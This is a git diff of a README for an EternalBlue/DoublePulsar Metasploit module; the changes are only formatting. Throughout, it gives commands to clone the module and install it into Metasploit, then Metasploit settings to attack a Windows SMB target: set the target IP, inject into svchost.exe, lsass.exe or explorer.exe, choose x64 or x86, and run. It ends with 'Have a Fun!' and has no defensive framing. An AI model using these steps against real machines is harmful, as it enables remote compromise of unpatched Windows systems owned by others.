@@ -2,26 +2,28 @@
 
 # How to Install
 <pre>
-- dpkg --add-architecture i386 && apt-get update -y && apt-get install wine32 -y
-- git clone https://github.com/grglzrv/Eternalblue-Doublepulsar-Metasploit.git
-- cd Eternalblue-Doublepulsar-Metasploit
-- cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
+~]# dpkg --add-architecture i386 && apt-get update -y && apt-get install wine32 -y
+~]# git clone https://github.com/grglzrv/Eternalblue-Doublepulsar-Metasploit.git
+~]# cd Eternalblue-Doublepulsar-Metasploit
+~]# cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
 
 Note !!!: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/exploits/windows/smb
 
 - mkdir -p /root/.wine/drive_c/
 </pre>
 # How to use
-
-- service postgresql start
-- service postgresql enable
-- msfconsole
+<pre>
+~]# service postgresql start
+~]# service postgresql enable
+~]# msfconsole
 - reload_all 
 - use exploit/windows/smb/eternalblue_doublepulsar
 - show options
-
- * For Windows x64 
-
+</pre>
+<br>
+ ## + For Windows x64 
+<br>
+<pre>
  - set RHOST (Target IP)
  - set PROCESSINJECT svchost.exe or set PROCESSINJECT lsass.exe
  - set TARGETARCHITECTURE x64
@@ -30,9 +32,9 @@ Note !!!: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/
  - show targets
  - set target 8
  - run or exploit
- 
- * For Windows x86
-
+ </pre>
+ ## + For Windows x86
+<pre>
  - set RHOST (Target IP)
  - set PROCESSINJECT svchost.exe or set PROCESSINJECT explorer.exe
  - set TARGETARCHITECTURE x86
@@ -41,5 +43,5 @@ Note !!!: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/
  - show targets
  - set target 8
  - run or exploit
- 
- # Have a Fun! :)
+ </pre>
+ ## Have a Fun! :)
